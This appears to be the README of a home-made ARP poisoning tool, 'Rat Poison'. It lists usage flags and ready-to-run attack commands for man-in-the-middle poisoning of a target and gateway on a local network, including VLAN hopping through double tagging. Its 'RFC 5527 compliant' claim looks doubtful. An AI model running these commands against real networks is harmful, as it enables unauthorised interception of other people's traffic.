# Rat Poison

A self-made ARP poisoning tool that is stealthy and RFC 5527 compliant. It is capable of VLAN double tagging and ARP poisoning.

## Usage Examples

Help Menu
```bash
python poison.py -h
```

Show Active Hosts within the Local Network
```bash
python poison.py -l 192.168.1.0/24
```
Enable Stealth Mode
```bash
python poison.py --stealth
```
Optional Arguments
ARP Poisoning Mode without VLAN Double Tagging
To be used with -T, -M, -G

```bash
python poison.py -P
```
ARP Poisoning Mode with VLAN Double Tagging
To be used with -T, -M, -G, -TM, -MM, -GM, --vlan1, --vlan2

```bash
python poison.py -PV
```

## Attack Examples

Normal ARP Poisoning
```bash
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

Normal ARP Poisoning with Stealth
```bash
python poison.py --stealth -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

VLAN Hopping with ARP Poisoning (Native VLAN 10, Target VLAN 20)
Requires Target MAC, Monitor MAC, Gateway MAC with vlan1 and vlan2
```bash
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1 -TM "AA:AA:AA:AA:AA:AA" -MM "BB:BB:BB:BB:BB:BB" -GM "CC:CC:CC:CC:CC:CC" --vlan1 10 --vlan2 20
```